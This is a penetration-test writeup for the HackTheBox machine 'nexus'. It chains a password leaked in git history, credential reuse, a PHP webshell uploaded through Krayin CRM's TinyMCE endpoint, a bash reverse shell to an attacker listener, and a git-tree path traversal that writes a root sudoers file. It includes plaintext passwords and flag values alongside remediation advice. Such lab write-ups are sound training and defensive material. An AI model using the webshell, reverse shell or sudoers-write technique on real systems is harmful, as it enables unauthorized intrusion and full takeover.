# Penetration Test Writeup — nexus (10.129.50.57 / nexus.htb)

**Engagement:** htb-10.129.50.57 (HackTheBox, authorized CTF)
**Date:** 2026-07-08
**Attack box:** <attacker_ip> (tun0)
**Result:** Full compromise — `user.txt` and `root.txt` captured, root shell obtained.

| Flag | Owner | Value |
|------|-------|-------|
| user.txt | jones | `<userflag>` |
| root.txt | root | `<rootflag>` |

---

## Executive Summary

nexus is a Linux (Ubuntu 24.04) host exposing only SSH and an nginx web server
that fronts three virtual hosts. The compromise did **not** rely on a single
memorable CVE; it was a chain of realistic misconfigurations and, above all,
**password reuse** across a database, a CRM admin panel, and a system SSH
account, culminating in a **custom root-owned path-traversal primitive** in a
homemade Gitea "template sync" service.

Chain at a glance:

```
Anonymous Gitea repo  →  DB password in git history  →  reuse → Krayin CRM admin
   →  authenticated TinyMCE upload RCE (www-data)  →  live .env DB password
   →  reuse → jones SSH (USER FLAG)  →  root-timer git path traversal  →  ROOT (ROOT FLAG)
```

---

## 1. Reconnaissance

Quick nmap (`-sV -sC --top-ports 1000`) and a full TCP sweep (`-p-`) agreed:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 |
| 80/tcp | HTTP | nginx 1.24.0 (Ubuntu) |

**Vhost triage:**
- `nexus.htb` — static marketing page, no dynamic surface. **Dead end.** (Yielded one
  OSINT username seed: `j.matthew` from a hiring-manager email.)
- `git.nexus.htb` — **Gitea 1.26.0**.
- `billing.nexus.htb` — **Krayin CRM** (Laravel, by Webkul), Laravel **Debugbar live**.

---

## 2. Information Disclosure — Gitea anonymous read (vuln id=1, id=2)

Gitea 1.26.0 had registration disabled but **anonymous API read** enabled:

```
GET /api/v1/repos/search  → public repo: admin/krayin-docker-setup
GET /api/v1/users/search  → users: admin, jones
```

Cloning `admin/krayin-docker-setup` and inspecting **full git history**
(`git log -p --all`) recovered a **database password that had been committed then
scrubbed**:

```
commit 1615c465 (.env):  DB_USERNAME=krayin   DB_PASSWORD=N27xh!!2ucY04
commit 9b817fa4 (HEAD):  DB_PASSWORD=""       (blanked, but recoverable from history)
```

→ Credential **`N27xh!!2ucY04`** (cred id=1). No APP_KEY or other live secrets
in the repo.

---

## 3. Credential Reuse → Krayin CRM Admin (vuln id=8, access id=1)

The git-history password was tested against SSH (failed) and the Krayin admin
login (`POST /admin/login`, email-based). It hit:

```
j.matthew@nexus.htb : N27xh!!2ucY04   →  authenticated /admin/dashboard  (admin)
```

→ cred id=2, access id=1. The DB password was reused as the CRM admin password.

---

## 4. Authenticated RCE — Krayin TinyMCE upload (CVE-2026-38526, vuln id=6, access id=2)

Krayin's TinyMCE upload endpoint performs **no file-type validation**:

```
POST /admin/tinymce/upload   (multipart field "file", Content-Type spoofed image/jpeg)
  body: <?php system($_GET['cmd']); ?>   filename: shell.php
  → {"location":"http://billing.nexus.htb/storage/tinymce/<hash>.php"}
```

Code execution was confirmed **egress-independently** first
(`?cmd=id` → `uid=33(www-data)`), then a bash reverse shell was fired to the
listener on `10.10.17.173:4444` — **www-data shell** (access id=2), stabilized to
a PTY.

> **Dead ends correctly abandoned here:** CVE-2021-3129 (Laravel Ignition RCE)
> — preconditions present (APP_DEBUG on, Ignition reachable) but the gadget was
> patched on this modern Laravel; even a corrected MSF module produced no
> callback. Dropped per operator directive.

---

## 5. On-box Secret → jones SSH (vuln id=9, access id=3) — USER FLAG

The **live** application config `/var/www/krayin/.env` (readable as www-data)
held a *different*, current DB password:

```
DB_PASSWORD=y27xb3ha!!74GbR      (cred id=3)
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=   (cred id=4, unused)
```

Host recon (as www-data) showed a **bare-metal Ubuntu 24.04 host** named `nexus`
(no container), with two real login users — `jones` and `git` — and local
services: MySQL (127.0.0.1:3306) and Gitea (127.0.0.1:3000, run as user `git`).

The new password was sprayed over SSH and reused **again**:

```
jones : y27xb3ha!!74GbR   →  SSH login  (access id=3)
```

```
cat /home/jones/user.txt  →  9b48ddc6464163c08c327f9622b0129f      ← USER FLAG
```

---

## 6. Privilege Escalation → ROOT (vuln id=11, access id=4) — ROOT FLAG

As jones: **no sudo, no privileged groups, no custom SUID/caps/cron.** The only
root vector was a homemade service:

**`gitea-template-sync.timer`** (root, every 60s) runs `/etc/gitea/template-sync.py`,
which pulls every Gitea repo flagged `template=true`, runs `git ls-tree -r HEAD`,
and writes each blob to:

```python
os.path.join('/home/git/template-staging/<owner>/<repo>', filepath)   # as root, mode 644
```

`filepath` comes **raw from the git tree entry with no `../` sanitization** →
**arbitrary root-owned file write.**

**Weaponization (lin-ops):**
1. Authenticated to Gitea as **jones** — `y27xb3ha!!74GbR` reused a *third* time
   (SSH password = Gitea password). (X-WEBAUTH-USER reverse-proxy auth bypass,
   CVE-2026-20896, was OFF — a dead end both externally and from localhost.)
2. Normal git rejects `..` paths, so the tree was hand-built with `git mktree`:
   **nested subtrees each named `..` (6 deep)** so `ls-tree -r` emitted
   `../../../../../../etc/sudoers.d/pwn`. A `!seed` blob (sorts before `..`)
   pre-created the staging directory so the traversal resolved on disk.
3. Pushed to `jones/tpl`, set `template=true` via `PATCH /api/v1/repos/jones/tpl`.
4. The root timer wrote `/etc/sudoers.d/pwn` = `jones ALL=(ALL) NOPASSWD: ALL`.
5. `sudo -n bash` → **uid=0**.

```
cat /root/root.txt  →  f3a4a0efa8517a9304b5a4f00faf1150            ← ROOT FLAG
```

---

## Full Access Chain (state graph)

```
vuln2 anon Gitea repo ─► cred1 DB pass (git history)
        │
        └► vuln8 password reuse ─► access1 j.matthew Krayin admin
                 │
                 └► vuln6 TinyMCE upload RCE ─► access2 www-data shell
                          │
                          └► cred3 live .env DB pass
                                   │
                                   └► vuln9 password reuse ─► access3 jones SSH ─► USER FLAG (vuln10)
                                            │
                                            └► vuln11 gitea-template-sync path traversal
                                                     └► access4 root ─► ROOT FLAG (vuln12)
```

---

## Findings by Severity

| Sev | Finding | ID |
|-----|---------|----|
| Critical | Krayin TinyMCE authenticated upload RCE (CVE-2026-38526) | 6 |
| Critical | Root `gitea-template-sync` git-tree path traversal → arbitrary root write | 11 |
| Critical | Password reuse: DB pass → Krayin admin | 8 |
| Critical | Password reuse: live DB pass → jones SSH (and → Gitea) | 9 |
| High | Krayin BOLA password-reset (CVE-2026-38529) — available, unused | 5 |
| High | Secret (DB password) left in Gitea commit history | 2 |
| Medium | Laravel debug mode + Ignition exposed (info leak) | 3 |
| Info | Gitea 1.26.0 anonymous API read / user enumeration | 1 |

**Dead ends (validated, then abandoned):**
- CVE-2021-3129 (Laravel Ignition RCE) — patched gadget / no callback (vuln 3, blocked).
- CVE-2026-20896 (Gitea X-WEBAUTH-USER auth bypass) — reverse-proxy auth off (vuln 4, blocked).

---

## Remediation

1. **Eliminate password reuse.** One password (`N27xh!!2ucY04`, then
   `y27xb3ha!!74GbR`) unlocked the DB, the CRM admin, an SSH account, and Gitea.
   Use unique, secrets-managed credentials per service.
2. **Purge secrets from git history** (not just the working tree) and rotate the
   exposed DB password. Disable anonymous Gitea API/repo read.
3. **Patch/replace the `template-sync.py` service.** Validate/normalize every
   path from `git ls-tree` (reject `..`, absolute paths); never write
   git-controlled paths as root; run the syncer as an unprivileged user in a
   confined directory.
4. **Krayin CRM:** upgrade to a fixed release (TinyMCE upload validation,
   CVE-2026-38526/38529), disable `APP_DEBUG`/Ignition in production, rotate
   `APP_KEY`.
5. **Harden uploads / web root** so uploaded files cannot be executed as PHP.

---

## Artifacts Left On Target (for cleanup)

- `/etc/sudoers.d/pwn` — `jones ALL=(ALL) NOPASSWD: ALL`
- Gitea repo `jones/tpl` (template=true) and crafted objects in `/tmp/.evil`, `/tmp/.kr`
- Webshell at `/storage/tinymce/7cc5b81255bbac14b5f62a6430920ad9.php`

Cleanup commands: `sudo rm /etc/sudoers.d/pwn`, delete repo `jones/tpl`,
`rm -rf /tmp/.evil /tmp/.kr`, and remove the uploaded webshell.

---

## Evidence Index (engagement/evidence/)

- `scan_10.129.50.57*.{nmap,xml,gnmap}` — port scans
- `source/krayin-docker-setup/`, `source/full-git-history.txt` — cloned repo + history leak
- `billing-*.{html,txt,jar}` — Krayin recon, j.matthew session
- `tinymce-*.txt`, `shell-6d2073fd-krayin-tinymce-rce.log` — RCE + www-data shell
- `ssh-reuse-results*.txt` — credential-reuse sprays
- `shell-6f9765f8-ssh-jones.log` — jones SSH session
- `root-gitea-template-sync-traversal.md` — full root exploit write-up
- `research/gitea-krayin-cve.md` — CVE/PoC research
